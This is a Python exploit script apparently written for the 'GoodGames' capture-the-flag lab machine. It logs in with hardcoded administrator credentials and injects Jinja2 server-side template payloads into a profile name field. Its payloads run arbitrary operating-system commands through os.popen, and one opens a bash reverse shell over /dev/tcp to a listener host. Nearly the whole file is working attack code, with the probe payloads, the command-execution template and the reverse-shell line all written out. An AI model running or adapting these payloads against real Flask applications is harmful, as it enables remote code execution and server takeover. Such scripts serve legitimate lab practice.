#!/usr/bin/env python3
"""
Flask SSTI Exploitation Script for GoodGames
Tests Server-Side Template Injection in Full Name field
"""

import requests
import sys
from urllib.parse import quote

# Configuration
TARGET_URL = "http://internal-administration.goodgames.htb"
LHOST = "10.10.15.179"
LPORT = "4444"

def print_banner():
    print("""
╔═══════════════════════════════════════════╗
║   Flask SSTI Exploitation Script         ║
║   Target: GoodGames Internal Admin        ║
╚═══════════════════════════════════════════╝
    """)

def login(session, email, password):
    """Login to get session cookie"""
    print(f"[*] Logging in as {email}...")
    
    login_url = f"{TARGET_URL}/login"
    data = {
        "email": email,
        "password": password
    }
    
    response = session.post(login_url, data=data, allow_redirects=True)
    
    if "dashboard" in response.text.lower() or response.status_code == 200:
        print("[+] Login successful!")
        return True
    else:
        print("[-] Login failed!")
        return False

def test_ssti(session, payload, description):
    """Test SSTI payload in Full Name field"""
    print(f"\n[*] Testing: {description}")
    print(f"[*] Payload: {payload}")
    
    # Update profile endpoint
    profile_url = f"{TARGET_URL}/settings"
    
    data = {
        "name": payload
    }
    
    response = session.post(profile_url, data=data, allow_redirects=True)
    
    # Check response
    print(f"[+] Response length: {len(response.text)} bytes")
    
    # Save response for analysis
    output_file = f"/home/kali/Labs/Machines/GoodGames/ssti_response_{description.replace(' ', '_')}.html"
    with open(output_file, 'w') as f:
        f.write(response.text)
    print(f"[+] Response saved to: {output_file}")
    
    return response.text

def exploit_rce(session, command):
    """Execute command via SSTI"""
    print(f"\n[!] Executing command: {command}")
    
    # RCE payload
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + command + "').read() }}"
    
    profile_url = f"{TARGET_URL}/settings"
    data = {"name": payload}
    
    response = session.post(profile_url, data=data, allow_redirects=True)
    
    # Try to extract command output from the page
    # Usually appears in the profile name display
    print(f"\n[+] Full response saved to: /home/kali/Labs/Machines/GoodGames/rce_output.html")
    with open('/home/kali/Labs/Machines/GoodGames/rce_output.html', 'w') as f:
        f.write(response.text)
    
    return response.text

def get_reverse_shell(session):
    """Get reverse shell"""
    print(f"\n[!] Attempting reverse shell to {LHOST}:{LPORT}")
    print(f"[!] Make sure you have a listener running: nc -lvnp {LPORT}")
    
    # Reverse shell payload
    rev_shell_cmd = f'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
    payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('" + rev_shell_cmd + "').read() }}"
    
    profile_url = f"{TARGET_URL}/settings"
    data = {"name": payload}
    
    try:
        response = session.post(profile_url, data=data, timeout=5)
    except requests.exceptions.Timeout:
        print("[+] Request timed out - shell might be connected!")
    except Exception as e:
        print(f"[!] Exception: {e}")

def main():
    print_banner()
    
    if len(sys.argv) < 2:
        print("Usage:")
        print(f"  {sys.argv[0]} test           # Test SSTI payloads")
        print(f"  {sys.argv[0]} rce <command>  # Execute command")
        print(f"  {sys.argv[0]} shell          # Get reverse shell")
        sys.exit(1)
    
    # Create session
    session = requests.Session()
    
    # Login
    if not login(session, "admin@goodgames.htb", "superadministrator"):
        print("[-] Failed to login!")
        sys.exit(1)
    
    mode = sys.argv[1]
    
    if mode == "test":
        print("\n" + "="*50)
        print("TESTING SSTI PAYLOADS")
        print("="*50)
        
        payloads = [
            ("{{7*7}}", "Basic Math"),
            ("{{config}}", "Config Disclosure"),
            ("{{self}}", "Self Object"),
            ("{{ self.__class__.__mro__ }}", "MRO Chain"),
            ("{{ self.__init__.__globals__.__builtins__ }}", "Builtins Access"),
        ]
        
        for payload, description in payloads:
            test_ssti(session, payload, description)
    
    elif mode == "rce":
        if len(sys.argv) < 3:
            print("[-] Please provide a command to execute")
            print(f"    Example: {sys.argv[0]} rce 'id'")
            sys.exit(1)
        
        command = sys.argv[2]
        exploit_rce(session, command)
        
    elif mode == "shell":
        print(f"\n[!] Starting reverse shell attack...")
        print(f"[!] Listener: nc -lvnp {LPORT}")
        input("[!] Press Enter when listener is ready...")
        get_reverse_shell(session)
    
    else:
        print(f"[-] Unknown mode: {mode}")
        sys.exit(1)

if __name__ == "__main__":
    main()
